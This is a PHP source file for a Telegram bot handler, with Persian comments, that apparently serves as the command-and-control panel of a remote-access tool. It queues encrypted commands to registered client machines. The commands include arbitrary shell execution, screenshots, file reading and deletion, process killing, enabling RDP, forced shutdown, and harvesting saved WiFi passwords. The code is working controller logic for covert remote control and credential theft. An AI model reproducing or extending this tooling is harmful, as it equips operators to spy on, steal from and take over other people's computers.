<?php

namespace Handlers;

use Services\LoggerService;
use Services\TelegramService;
use Services\ClientService;
use Services\EncryptionService;
use PDO;

require_once __DIR__ . '/../../config.php';

class CallbackQueryHandler
{
    private $pdo;
    private $logger;
    private $telegram;
    private $clientService;
    private $encryption;

    public function __construct(PDO $pdo, LoggerService $logger, TelegramService $telegram, ClientService $clientService)
    {
        $this->pdo = $pdo;
        $this->logger = $logger;
        $this->telegram = $telegram;
        $this->clientService = $clientService;
        $this->encryption = new EncryptionService($logger);
    }

    public function handle(array $callbackQuery)
    {
        $chatId = $callbackQuery['message']['chat']['id'] ?? null;
        $userId = $callbackQuery['from']['id'] ?? null;
        $data = $callbackQuery['data'] ?? null;
        $callbackQueryId = $callbackQuery['id'] ?? null;

        $this->logger->logWebhook("Processing callback_query: id=$callbackQueryId, user_id=$userId, chat_id=$chatId, data=$data");

        // بررسی داده‌های ورودی
        if (!$chatId || !$userId || !$data || !$callbackQueryId) {
            $this->handleInvalidQuery($callbackQueryId, $chatId, json_encode($callbackQuery));
            return;
        }

        // بررسی احراز هویت
        if (!$this->clientService->isUserAuthorized($userId)) {
            $this->handleUnauthorized($callbackQueryId, $chatId);
            return;
        }

        // پاسخ سریع به callback query
        $this->telegram->answerCallbackQuery($callbackQueryId);

        // بررسی فرمت data
        if (!str_contains($data, ':')) {
            $this->handleInvalidData($callbackQueryId, $chatId, $data);
            return;
        }

        list($action, $value) = explode(':', $data, 2);
        $this->logger->logWebhook("Callback action: $action, value: $value");

        // پردازش بر اساس نوع action
        if ($action === 'select_client') {
            $this->handleSelectClient($callbackQueryId, $chatId, $userId, $value);
        } elseif ($action === 'command') {
            $this->handleCommand($callbackQueryId, $chatId, $userId, $value);
        } elseif ($action === 'file_action') {
            $this->handleFileAction($callbackQueryId, $chatId, $userId, $value);
        } else {
            $this->telegram->sendPlainMessage($chatId, "❌ Error: Unknown action.");
            $this->logger->logError("Unknown callback action: $action");
        }
    }

    private function handleInvalidQuery(?string $callbackQueryId, ?string $chatId, string $data)
    {
        $this->logger->logError("Invalid callback_query: missing required fields, data=$data");

        if ($callbackQueryId) {
            $this->telegram->answerCallbackQuery($callbackQueryId, 'Error: Invalid request', true);
        }

        if ($chatId) {
            $this->telegram->sendPlainMessage($chatId, "❌ Error: Invalid callback request.");
        }
    }

    private function handleUnauthorized(string $callbackQueryId, string $chatId)
    {
        $this->telegram->sendPlainMessage($chatId, "🚫 Unauthorized access. Only the admin can issue commands.");
        $this->telegram->answerCallbackQuery($callbackQueryId, 'Unauthorized', true);
        $this->logger->logError("Unauthorized callback attempt");
    }

    private function handleInvalidData(string $callbackQueryId, string $chatId, string $data)
    {
        $this->logger->logError("Invalid callback_data format: $data");
        $this->telegram->sendPlainMessage($chatId, "❌ Error: Invalid callback data.");
        $this->telegram->answerCallbackQuery($callbackQueryId, 'Invalid callback data', true);
    }

    private function handleSelectClient(string $callbackQueryId, string $chatId, string $userId, string $clientId)
    {
        $this->logger->logWebhook("Attempting to select client: $clientId");

        if ($this->clientService->clientExists($clientId)) {
            $this->clientService->setSelectedClient($userId, $clientId);
            $this->logger->logWebhook("Client selected successfully: $clientId for user: $userId");

            // NEW: چک کردن وضعیت آنلاین بعد از انتخاب
            $isOnline = $this->isClientOnline($clientId);
            $statusMessage = $isOnline ? "🟢 آنلاین" : "🔴 آفلاین";
            $message = "✅ کلاینت انتخاب شد: $clientId ($statusMessage)\n\nدستور مورد نظر را انتخاب کنید:";

            // NEW: اگر آفلاین بود، هشدار بده
            if (!$isOnline) {
                $message .= "\n⚠️ توجه: این کلاینت بیش از ۵ دقیقه آفلاین است. دستورات ممکن است اجرا نشوند.";
            }

            $this->telegram->sendPlainMessage($chatId, $message, [
                'reply_markup' => $this->getCommandKeyboard()
            ]);
        } else {
            $this->telegram->sendPlainMessage($chatId, "❌ کلاینت '$clientId' یافت نشد.\n\nاز /start برای دیدن کلاینت‌ها استفاده کنید.");
            $this->logger->logError("کلاینت نامعتبر در callback: $clientId");
        }
    }

    private function handleCommand(string $callbackQueryId, string $chatId, string $userId, string $command)
    {
        $selectedClient = $this->clientService->getSelectedClient($userId);
        $this->logger->logWebhook("پردازش دستور: $command برای کلاینت انتخاب‌شده: " . ($selectedClient ?? 'هیچ'));

        if ($selectedClient) {
            // NEW: چک کردن وضعیت آنلاین قبل از صف کردن دستور
            if (!$this->isClientOnline($selectedClient)) {
                $this->telegram->sendPlainMessage($chatId, "⚠️ کلاینت '$selectedClient' آفلاین است (بیش از ۵ دقیقه از آخرین فعالیت گذشته). دستور ارسال نشد.\n\nکلاینت دیگری انتخاب کنید.");
                $this->logger->logWebhook("دستور رد شد به دلیل آفلاین بودن کلاینت: $selectedClient");
                return;
            }

            // پردازش دستورات خاص
            if ($command === '/select') {
                // بازگشت به منوی انتخاب کلاینت
                $this->sendClientKeyboard($chatId);
                return;
            }

            $response = $this->queueCommand($selectedClient, $command);

            if (isset($response['status']) && $response['status'] === 'success') {
                $this->telegram->sendPlainMessage($chatId, "✅ دستور '$command' برای کلاینت $selectedClient صف شد.");
                $this->logger->logWebhook("دستور با موفقیت صف شد: $command برای کلاینت: $selectedClient");
            } else {
                $this->telegram->sendPlainMessage($chatId, "❌ خطا در صف کردن دستور: " . ($response['error'] ?? 'خطای ناشناخته'));
                $this->logger->logError("خطا در صف کردن دستور: " . json_encode($response));
            }
        } else {
            $this->telegram->sendPlainMessage($chatId, "⚠️ هیچ کلاینتی انتخاب نشده.\n\nاز /start یا /select <client_id> استفاده کنید.");
            $this->logger->logError("دستور بدون کلاینت انتخاب‌شده");
        }
    }

    private function handleFileAction(string $callbackQueryId, string $chatId, string $userId, string $value)
    {
        if (!str_contains($value, '|')) {
            $this->logger->logError("فرمت file_action نامعتبر: $value");
            return;
        }

        list($subAction, $path) = explode('|', $value, 2);
        $selectedClient = $this->clientService->getSelectedClient($userId);

        if ($selectedClient) {
            // NEW: چک کردن وضعیت آنلاین برای عملیات فایل
            if (!$this->isClientOnline($selectedClient)) {
                $this->telegram->sendPlainMessage($chatId, "⚠️ کلاینت '$selectedClient' آفلاین است. عملیات فایل ارسال نشد.");
                $this->logger->logWebhook("عملیات فایل رد شد به دلیل آفلاین بودن کلاینت: $selectedClient");
                return;
            }

            if ($subAction === 'read') {
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'read', 'path' => $path]];
                $this->queueCommand($selectedClient, $commandData);
                $this->telegram->sendPlainMessage($chatId, "📄 خواندن فایل: $path");
            } elseif ($subAction === 'delete') {
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'delete', 'path' => $path]];
                $this->queueCommand($selectedClient, $commandData);
                $this->telegram->sendPlainMessage($chatId, "🗑️ حذف: $path");
            }
            $this->logger->logWebhook("عملیات فایل صف شد: $subAction برای مسیر: $path");
        } else {
            $this->telegram->sendPlainMessage($chatId, "⚠️ هیچ کلاینتی انتخاب نشده.");
        }
    }

    // NEW: تابع جدید برای چک کردن وضعیت آنلاین کلاینت
    private function isClientOnline(string $clientId): bool
    {
        try {
            $stmt = $this->pdo->prepare("SELECT last_seen FROM clients WHERE client_id = ?");
            $stmt->execute([$clientId]);
            $client = $stmt->fetch();

            if (!$client || !$client['last_seen']) {
                return false;
            }

            $lastSeenTimestamp = strtotime($client['last_seen']);
            $currentTime = time();
            return ($currentTime - $lastSeenTimestamp) <= \Config::$ONLINE_THRESHOLD;
        } catch (\PDOException $e) {
            $this->logger->logError("خطا در چک وضعیت آنلاین کلاینت $clientId: " . $e->getMessage());
            return false; // در صورت خطا، آفلاین در نظر بگیر
        }
    }

    private function queueCommand(string $clientId, $command): array
    {
        try {
            // Ensure command is properly formatted with type information
            if (is_string($command) && !json_decode($command)) {
                // It's a simple command string, wrap it in proper format
                $commandType = $this->detectCommandType($command);
                $commandData = [
                    'type' => $commandType,
                    'params' => $this->parseCommandParams($command),
                    'original_command' => $command,
                    'command_type' => $commandType, // Explicitly store command type
                    'timestamp' => time()
                ];
                $commandStr = json_encode($commandData);
            } else {
                $commandData = is_array($command) ? $command : json_decode($command, true);
                // Ensure command_type is set
                if (is_array($commandData) && !isset($commandData['command_type'])) {
                    $commandData['command_type'] = $commandData['type'] ?? 'unknown';
                }
                $commandStr = json_encode($commandData);
            }

            $encryptedCommand = $this->encryption->encrypt($commandStr);

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
            VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);

            $commandId = $this->pdo->lastInsertId();
            $this->logger->logWebhook("Command with ID: $commandId queued - Type: " . ($commandData['command_type'] ?? 'unknown'));

            return ['status' => 'success', 'command_id' => $commandId];
        } catch (\PDOException $e) {
            $this->logger->logError("Error queuing command: " . $e->getMessage());
            return ['error' => 'Error queuing command: ' . $e->getMessage()];
        }
    }

    // در تابع detectCommandType، بخش commandMap را آپدیت کنید:
    private function detectCommandType(string $command): string
    {
        $commandMap = [
            '/status' => 'status',
            '/screenshot' => 'capture_screenshot',
            '/exec' => 'system_command',
            '/browse' => 'file_operation',
            '/get-info' => 'system_info',          // ✅ اضافه شد
            '/go' => 'open_url',
            '/shutdown' => 'system_command',
            '/restart' => 'system_command',
            '/sleep' => 'system_command',
            '/signout' => 'system_command',
            '/tasks' => 'process_management',      // ✅ اضافه شد
            '/end_task' => 'end_task',             // ✅ اضافه شد
            '/enable_rdp' => 'enable_rdp',         // ✅ اضافه شد
            '/disable_rdp' => 'disable_rdp',       // ✅ اضافه شد
            '/getwifipasswords' => 'get_wifi_passwords', // ✅ اضافه شد
        ];

        foreach ($commandMap as $cmd => $type) {
            if (str_starts_with($command, $cmd)) {
                return $type;
            }
        }

        return 'unknown';
    }

    private function parseCommandParams(string $command): array
    {
        $params = [];

        // دستور /exec - اجرای دستور سیستم
        if (preg_match('/^\/exec\s+(.+)$/', $command, $matches)) {
            $params['command'] = trim($matches[1]);
        }

        // دستور /browse - مرور فایل‌ها
        elseif (preg_match('/^\/browse\s+(.+)$/', $command, $matches)) {
            $params['action'] = 'list';
            $params['path'] = trim($matches[1]);
        }

        // دستور /end_task - پایان دادن به تسک
        elseif (preg_match('/^\/end_task\s+(.+)$/', $command, $matches)) {
            $params['process_name'] = trim($matches[1]);
        }

        // دستور /go - باز کردن URL
        elseif (preg_match('/^\/go\s+(.+)$/', $command, $matches)) {
            $params['url'] = trim($matches[1]);
        }

        // دستور /tasks - لیست فرآیندها
        elseif (str_starts_with($command, '/tasks')) {
            $params['action'] = 'list';
        }

        // دستور /get-info - اطلاعات سیستم
        elseif (str_starts_with($command, '/get-info')) {
            $params['action'] = 'full';
        }

        // دستور /getwifipasswords - دریافت پسوردهای WiFi
        elseif (str_starts_with($command, '/getwifipasswords')) {
            $params['action'] = 'all';
        }

        // دستور /enable_rdp - فعال‌سازی RDP
        elseif (str_starts_with($command, '/enable_rdp')) {
            $params['action'] = 'enable';
        }

        // دستور /disable_rdp - غیرفعال‌سازی RDP
        elseif (str_starts_with($command, '/disable_rdp')) {
            $params['action'] = 'disable';
        }

        // دستورات مدیریت سیستم
        elseif (str_starts_with($command, '/shutdown')) {
            $params['command'] = 'shutdown';
        } elseif (str_starts_with($command, '/restart')) {
            $params['command'] = 'restart';
        } elseif (str_starts_with($command, '/sleep')) {
            $params['command'] = 'sleep';
        } elseif (str_starts_with($command, '/signout')) {
            $params['command'] = 'signout';
        }

        // دستور /status - وضعیت سیستم
        elseif (str_starts_with($command, '/status')) {
            $params['action'] = 'check';
        }

        // دستور /screenshot - گرفتن عکس از صفحه
        elseif (str_starts_with($command, '/screenshot')) {
            $params['action'] = 'capture';
        }

        return $params;
    }

    private function getCommandKeyboard(): array
    {
        $commands = [
            '/status' => '📊 وضعیت',
            '/screenshot' => '📸 اسکرین‌شات',
            '/exec' => '⚙️ اجرا',
            '/browse' => '📁 مرور',
            '/get-info' => 'ℹ️ اطلاعات سیستم',
            '/go' => '🌐 باز کردن URL',
            '/shutdown' => '🔴 خاموش کردن',
            '/restart' => '🔄 راه‌اندازی مجدد',
            '/sleep' => '😴 خواب',
            '/signout' => '🚪 خروج',
            '/tasks' => '📋 وظایف',
            '/end_task' => '❌ پایان وظیفه',
            '/enable_rdp' => '🖥️ فعال کردن RDP',
            '/disable_rdp' => '🚫 غیرفعال کردن RDP',
            '/getwifipasswords' => '📡 رمزهای WiFi',
            '/select' => '🔙 انتخاب کلاینت'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];

        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];

            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }

        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        return $keyboard;
    }

    private function sendClientKeyboard(string $chatId)
    {
        try {
            $onlineThreshold = date('Y-m-d H:i:s', time() - \Config::$ONLINE_THRESHOLD);

            $stmt = $this->pdo->prepare(
                "SELECT client_id, ip_address, 
                IF(last_seen > ?, 1, 0) as is_online 
                FROM clients
                ORDER BY is_online DESC, last_seen DESC"
            );
            $stmt->execute([$onlineThreshold]);
            $clients = $stmt->fetchAll();

            if (empty($clients)) {
                $this->telegram->sendPlainMessage($chatId, "هیچ کلاینتی ثبت نشده.");
                return;
            }

            $keyboard = ['inline_keyboard' => []];
            $row = [];

            foreach ($clients as $client) {
                $status = $client['is_online'] ? '🟢' : '🔴';
                $buttonText = "$status {$client['client_id']} ({$client['ip_address']})";

                $row[] = [
                    'text' => $buttonText,
                    'callback_data' => "select_client:{$client['client_id']}"
                ];

                if (count($row) == 2) {
                    $keyboard['inline_keyboard'][] = $row;
                    $row = [];
                }
            }

            if ($row) {
                $keyboard['inline_keyboard'][] = $row;
            }

            $this->telegram->sendPlainMessage($chatId, "یک کلاینت انتخاب کنید:", ['reply_markup' => $keyboard]);
        } catch (\PDOException $e) {
            $this->logger->logError("خطا در واکشی کلاینت‌ها: " . $e->getMessage());
            $this->telegram->sendPlainMessage($chatId, "❌ خطا در واکشی کلاینت‌ها.");
        }
    }
}
